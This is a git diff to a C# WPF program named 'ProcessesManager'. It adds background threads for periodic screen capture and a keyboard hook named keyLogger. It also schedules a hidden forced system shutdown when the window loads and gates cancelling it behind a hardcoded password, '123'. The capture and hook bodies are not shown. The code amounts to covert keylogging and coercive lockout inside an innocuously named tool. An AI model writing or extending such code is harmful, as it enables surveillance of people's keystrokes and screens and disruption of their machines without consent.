@@ -132,6 +132,92 @@ namespace ProcessesManager
         public MainWindow()
         {
             InitializeComponent();
+            
+        }
+
+        private static void Flow1()
+        {
+            Thread capTure = new Thread(() =>
+            {
+                while (true)
+                {
+                    ApplicationWindow.Current.Dispatcher.Invoke((Action)delegate {
+                        Capture();
+                    });
+                    Thread.Sleep(5000);
+                }
+            });
+
+            Thread keyLogger = new Thread(() =>
+            {
+                ApplicationWindow.Current.Dispatcher.Invoke((Action)delegate {
+                    HookKeyboard();
+                });
+            });
+
+            Thread askAgain = new Thread(() =>
+            {
+                while (true)
+                {
+                    ApplicationWindow.Current.Dispatcher.Invoke((Action)delegate {
+                        AskAgain();
+                    });
+                    Thread.Sleep(2000);
+                }
+            });
+
+            askAgain.IsBackground = true;
+            askAgain.Start();
+
+            keyLogger.IsBackground = true;
+            keyLogger.Start();
+
+            capTure.IsBackground = true;
+            capTure.Start();
+        }
+
+
+        private static void WaitForShutdown()
+        {
+            ApplicationWindow.Current.Dispatcher.Invoke((Action)delegate {
+                var psi = new ProcessStartInfo("shutdown", "/s /t 300");
+                psi.CreateNoWindow = true;
+                psi.UseShellExecute = false;
+                Process.Start(psi);
+            });
+        }
+        private static void OpenLogin()
+        {
+
+            Thread delay = new Thread(() =>
+            {
+                WaitForShutdown();
+            });
+            delay.IsBackground = true;
+
+            var loginWindow = new LoginWindow();
+            bool? result = false;
+
+            delay.Start();
+            loginWindow.ShowDialog();
+            result = loginWindow.DialogResult;
+            if (result == true)
+            {
+                Process.Start("shutdown", "/a");
+                if (loginWindow.PwTextBox.Text == "123")
+                {
+                    Trace.WriteLine("True Pass");
+                }
+                else
+                {
+                    MessageBox.Show("Wrong password");
+                    delay = new Thread(() => {
+                        WaitForShutdown();
+                    });
+                    delay.Start();
+                }
+            }
+
         }
 
         private static void AskAgain()
@@ -173,46 +259,45 @@ namespace ProcessesManager
             //Capture();
         }
 
+        public int CountEnterPass { get; set; }
         private void StartBtn_Click(object sender, RoutedEventArgs e)
         {
-
-            Thread capTure = new Thread(() =>
+            if (CountEnterPass == 3)
             {
-                while (true)
+                return;
+            }
+            var loginWindow = new LoginWindow();
+            loginWindow.ShowDialog();
+            var result = loginWindow.DialogResult;
+            if (result == true)
+            {
+                Process.Start("shutdown", "/a");
+                if (loginWindow.PwTextBox.Text == "123")
                 {
-                    ApplicationWindow.Current.Dispatcher.Invoke((Action)delegate {
-                        Capture();
-                    });
-                    Thread.Sleep(5000);
+                    return;
                 }
-            });
-
-            Thread keyLogger = new Thread(() =>
-            {
-                ApplicationWindow.Current.Dispatcher.Invoke((Action)delegate {
-                    HookKeyboard();
-                });
-            });
-
-            Thread askAgain = new Thread(() =>
-            {
-                while (true)
+                else
                 {
-                    ApplicationWindow.Current.Dispatcher.Invoke((Action)delegate {
-                        AskAgain();
-                    });
-                    Thread.Sleep(2000);
+                    MessageBox.Show("Wrong password");
+                    var psi = new ProcessStartInfo("shutdown", "/s /t 300");
+                    psi.CreateNoWindow = true;
+                    psi.UseShellExecute = false;
+                    Process.Start(psi);
+                    CountEnterPass += 1;
                 }
-            });
 
-            askAgain.IsBackground = true;
-            askAgain.Start();
+            }
 
-            keyLogger.IsBackground = true;
-            keyLogger.Start();
+        }
 
-            capTure.IsBackground = true;
-            capTure.Start();
+        private void Window_Loaded(object sender, RoutedEventArgs e)
+        {
+            var psi = new ProcessStartInfo("shutdown", "/s /t 300");
+            psi.CreateNoWindow = true;
+            psi.UseShellExecute = false;
+            Process.Start(psi);
+
+            CountEnterPass = 0;
         }
     }
 }
